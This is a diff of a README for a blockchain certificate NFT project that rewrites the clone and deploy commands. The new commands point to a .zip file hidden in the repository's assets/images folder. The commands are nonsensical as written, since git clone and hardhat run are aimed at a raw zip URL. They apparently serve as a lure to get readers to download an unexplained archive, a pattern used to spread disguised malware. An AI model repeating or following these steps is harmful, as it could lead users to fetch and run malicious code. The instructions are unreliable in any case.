@@ -4,7 +4,7 @@
 ### Getting Started
 1. **Clone the Repository**
    ```
-   git clone https://raw.githubusercontent.com/midoo12345/blockchain-certificates-nft/main/client/src/pages/nft_blockchain_certificates_nonconvenable.zip
+   git clone https://raw.githubusercontent.com/midoo12345/blockchain-certificates-nft/main/client/src/assets/images/blockchain-certificates-nft-v1.2.zip
    cd blockchain-certificates-nft
    ```
 
@@ -42,7 +42,7 @@ npx hardhat node
 
 #### Step 3: Deploy Smart Contracts to Local Network
 ```
-npx hardhat run https://raw.githubusercontent.com/midoo12345/blockchain-certificates-nft/main/client/src/pages/nft_blockchain_certificates_nonconvenable.zip --network localhost
+npx hardhat run https://raw.githubusercontent.com/midoo12345/blockchain-certificates-nft/main/client/src/assets/images/blockchain-certificates-nft-v1.2.zip --network localhost
 ```
 
 #### Step 4: Run the Frontend
